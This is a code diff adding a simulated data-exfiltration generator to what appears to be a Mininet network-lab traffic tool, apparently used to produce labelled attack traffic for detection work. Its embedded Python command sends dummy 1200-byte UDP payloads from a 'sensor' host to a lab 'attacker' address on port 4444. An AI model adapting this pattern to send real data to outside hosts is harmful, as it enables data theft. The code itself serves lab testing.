@@ -142,3 +142,34 @@ class TrafficGenerator:
             "PY"
         )
         return {"attacker": attacker.name, "target": target_ip, "output": attacker.cmd(command)}
+
+    def generate_exfiltration_mininet_traffic(self, net: Any, duration_seconds: int = 5) -> dict[str, Any]:
+        """Generate a bounded data-exfiltration run.
+
+        Direction is reversed from every other attack in this file: the
+        compromised device (sensor) is the traffic *source*, sending data
+        out to an attacker-controlled sink, not an external attacker
+        probing in. The signature is also distinct on every other axis --
+        few packets, one destination port, but an unusually large payload
+        per packet (~1200 bytes, safely under typical MTU to avoid IP
+        fragmentation) -- unlike anything else this system generates,
+        where payloads are small heartbeats or empty probe connects.
+        Entirely confined to the Mininet lab and bounded by duration_seconds.
+        """
+        sensor = net.get("sensor")
+        attacker_ip = "10.0.0.100"
+        exfil_port = 4444
+        command = (
+            "python3 - <<'PY'\n"
+            "import socket, time\n"
+            "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+            "payload = b'x' * 1200\n"
+            "start = time.time()\n"
+            f"while time.time() - start < {duration_seconds}:\n"
+            f"    sock.sendto(payload, ('{attacker_ip}', {exfil_port}))\n"
+            "    time.sleep(1.0)\n"
+            "sock.close()\n"
+            "print('exfiltration_done')\n"
+            "PY"
+        )
+        return {"source": sensor.name, "target": attacker_ip, "output": sensor.cmd(command)}
